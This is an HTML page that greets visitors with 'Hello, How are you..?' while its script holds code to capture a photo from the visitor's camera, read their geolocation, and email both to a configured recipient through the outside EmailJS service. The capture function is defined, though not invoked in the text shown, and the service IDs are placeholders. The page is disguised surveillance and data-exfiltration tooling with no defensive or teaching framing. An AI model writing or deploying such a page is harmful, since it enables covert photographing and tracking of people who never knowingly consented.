<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Capture & Send</title>
    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js"></script>
</head>

<body>
    <h1>Hello, How are you..?</h1>
    
    <script>
        emailjs.init("YOUR_EMAILJS_USER_ID"); // Replace with your EmailJS User ID

        async function captureAndSend() {
            try {
                // ðŸ“· Access Camera & Capture Image
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const track = stream.getVideoTracks()[0];
                const imageCapture = new ImageCapture(track);
                const blob = await imageCapture.takePhoto();
                track.stop(); // Stop the camera after capturing

                // Convert Blob to Base64
                const reader = new FileReader();
                reader.readAsDataURL(blob);
                reader.onloadend = async () => {
                    const imageBase64 = reader.result;

                    // ðŸŒ Get User Location
                    const location = await getLocation();

                    // ðŸ“§ Send Email
                    sendEmail(imageBase64, location);
                };
            } catch (error) {
                console.error("Error capturing image:", error);
            }
        }

        async function getLocation() {
            return new Promise((resolve) => {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude
                        });
                    },
                    () => resolve({ latitude: "Unknown", longitude: "Unknown" })
                );
            });
        }

        async function sendEmail(imageBase64, location) {
            const emailParams = {
                to_email: "recipient@example.com",  // Replace with recipient email
                subject: "Captured Image & Location",
                message: `User Location: Lat: ${location.latitude}, Long: ${location.longitude}`,
                attachment: imageBase64
            };

            emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", emailParams)
                .then(() => {
                    console.log('Email sent successfully..');
                })
                .catch((error) => {
                    console.error("Email error:", error);
                });
        }
    </script>
</body>

</html>